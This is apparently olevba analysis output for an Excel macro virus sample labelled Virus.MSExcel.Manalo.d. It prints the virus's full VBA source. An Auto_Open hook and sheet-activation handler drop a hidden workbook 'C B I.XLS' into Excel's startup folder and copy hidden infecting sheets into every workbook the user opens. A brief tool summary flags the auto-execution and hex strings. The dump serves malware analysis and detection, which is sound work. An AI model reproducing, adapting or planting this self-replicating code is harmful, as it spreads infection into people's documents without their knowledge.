olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Manalo.d-4401d967e73e6030a0596d0c34c28c4d8e6d3432
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Life_Blood.bas 
in file: Virus.MSExcel.Manalo.d-4401d967e73e6030a0596d0c34c28c4d8e6d3432 - OLE stream: '_VBA_PROJECT_CUR/VBA/Life_Blood'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

















'
' INC v1.0
'



Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
        Application.OnSheetActivate = "Jacob"

End Sub

Sub Jacob()
Attribute Jacob.VB_ProcData.VB_Invoke_Func = " \n14"
        
Startup$ = Application.StartupPath
File$ = Dir(Startup$ & "\" & "C B I.XLS")

If File$ <> "C B I.XLS" Then GoTo FileDoesNotExist Else GoTo InfectOpenFile

FileDoesNotExist:
            
   Infected$ = ActiveWorkbook.Name
   
   Application.ScreenUpdating = False

   Set newBook = Workbooks.Add
    With newBook
        .Title = ""
        .Subject = ""
    End With
   
   NewWorkbook$ = ActiveWorkbook.Name
   Sheet$ = Workbooks(NewWorkbook$).Sheets(1).Name
        
   If Sheet$ <> "Life_Blood" _
      Then
        Workbooks(Infected$).Sheets("INC").Copy Before:=Workbooks(NewWorkbook$).Sheets(1)
        Workbooks(Infected$).Sheets("Life_Blood").Copy Before:=Workbooks(NewWorkbook$).Sheets("INC")
        Workbooks(NewWorkbook$).Sheets("Life_Blood").Visible = False
        Workbooks(NewWorkbook$).Sheets("INC").Visible = False
      Else
   End If

   ActiveWindow.Visible = False
      
   Workbooks(NewWorkbook$).SaveAs FileName:=Application.StartupPath & "/" & "C B I.XLS"

GoTo Finish

InfectOpenFile:
        
   FileName$ = ActiveWorkbook.Name
   FirstSheet$ = Workbooks(FileName$).Sheets(1).Name
        
   Application.ScreenUpdating = False
   
   If FirstSheet$ <> "Life_Blood" _
      Then
        Workbooks("C B I.XLS").Sheets("Life_Blood").Copy Before:=Workbooks(FileName$).Sheets(1)
        Workbooks("C B I.XLS").Sheets("INC").Copy After:=Workbooks(FileName$).Sheets("Life_Blood")
        Workbooks(FileName$).Sheets("INC").Name = "85 Years"
        Workbooks("C B I.XLS").Sheets("INC").Copy Before:=Workbooks(FileName$).Sheets("85 Years")
        Workbooks(FileName$).Sheets("Life_Blood").Visible = False
        Workbooks(FileName$).Sheets("INC").Visible = False
        Workbooks(FileName$).Sheets("85 Years").Visible = False

      Else
   End If

If Format(Now(), "yy mm dd") >= "99 07 27" Then


Else: Workbooks(FileName$).Sheets("85 Years").Visible = False
End If


Finish:
Application.OnSheetActivate = ""
Application.ScreenUpdating = True
Application.OnSheetActivate = "C B I.XLS!Jacob"
End Sub

-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Manalo.d-4401d967e73e6030a0596d0c34c28c4d8e6d3432 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

